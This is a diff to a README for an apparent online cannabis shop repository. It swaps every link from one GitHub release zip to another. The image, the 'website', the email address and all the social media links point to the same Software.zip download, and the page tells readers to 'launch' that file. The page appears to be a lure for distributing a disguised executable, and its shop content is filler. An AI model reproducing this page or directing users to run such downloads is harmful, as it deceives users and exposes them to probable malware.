@@ -1,6 +1,6 @@
 # 🌿 Welcome to the Cannabis Shop Online 🌿
 
-![Cannabis Image](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)
+![Cannabis Image](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -14,12 +14,12 @@ canabis-shop-online, cannabinoids, cannabinoids-hemp, cannabinoids-oil, cannabin
 ---
 
 ## 🌐 Visit our Cannabis Shop Online Website:
-👉 [Cannabis Shop Online Website](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)
+👉 [Cannabis Shop Online Website](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🚀 Get Started:
-To start exploring our collection, simply [launch the https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip file](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip) and dive into the world of cannabis products.
+To start exploring our collection, simply [launch the https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip file](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip) and dive into the world of cannabis products.
 
 ### 🌱 Featured Offer:
 Check out our premium CBD oils and cannabis extracts to experience the benefits of cannabinoids like never before.
@@ -57,7 +57,7 @@ Explore our detailed weed classification system to understand the differences be
 Your feedback is essential to us. Feel free to reach out with any questions, suggestions, or concerns regarding our products or services. We are here to ensure your experience with us is nothing short of exceptional.
 
 ### 📧 Contact Us:
-Email: https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip
+Email: https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip
 Phone: 1-800-CANNABIS
 
 ---
@@ -66,9 +66,9 @@ Phone: 1-800-CANNABIS
 Follow us on social media for exciting updates, promotions, and exclusive offers.
 
 ### 📸 Social Media:
-- [Facebook](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)
-- [Instagram](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)
-- [Twitter](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)
+- [Facebook](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)
+- [Twitter](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -77,4 +77,4 @@ Get ready to embark on a unique and enlightening journey through the world of ca
 
 ### 🌿 Happy Shopping! 🛒🌱
 
-[![Launch https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v1.0/Release.zip)
+[![Launch https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)](https://github.com/etxb/Cannabis-Shop-Online/releases/download/v2.0/Software.zip)
